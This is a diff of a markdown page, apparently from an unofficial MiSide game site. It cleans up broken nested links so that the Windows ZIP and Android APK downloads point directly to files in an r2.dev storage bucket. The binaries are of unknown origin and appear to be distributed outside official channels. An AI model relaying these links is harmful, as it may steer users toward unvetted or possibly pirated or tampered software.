@@ -38,11 +38,11 @@ MiSide Game is a groundbreaking psychological horror adventure that begins with 
 ## Download Links
 
 ### Windows Full Version
-- Direct Download: [MiSide-windows.zip]([[https://s.misidegame.org/games/miside/MiSide-windows.zip](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/MiSide-windows.zip)](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/MiSide-windows.zip)
+- Direct Download: [MiSide-windows.zip](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/MiSide-windows.zip)
 - Features: Complete game with all content and latest updates
 
 ### Android Version
-- Download APK: [MiSide-android.apk]([[https://s.misidegame.org/games/miside/Miside-andoird-Mobile_1_APKPure.apk](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/Miside-andoird-Mobile_1_APKPure.ap)](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/Miside-andoird-Mobile_1_APKPure.apk)
+- Download APK: [MiSide-android.apk](https://pub-de18dc3c90824394abf06cb24b33028d.r2.dev/miside/Miside-andoird-Mobile_1_APKPure.apk)
 - Features: Mobile-optimized controls and interface
 
 ### Steam Version
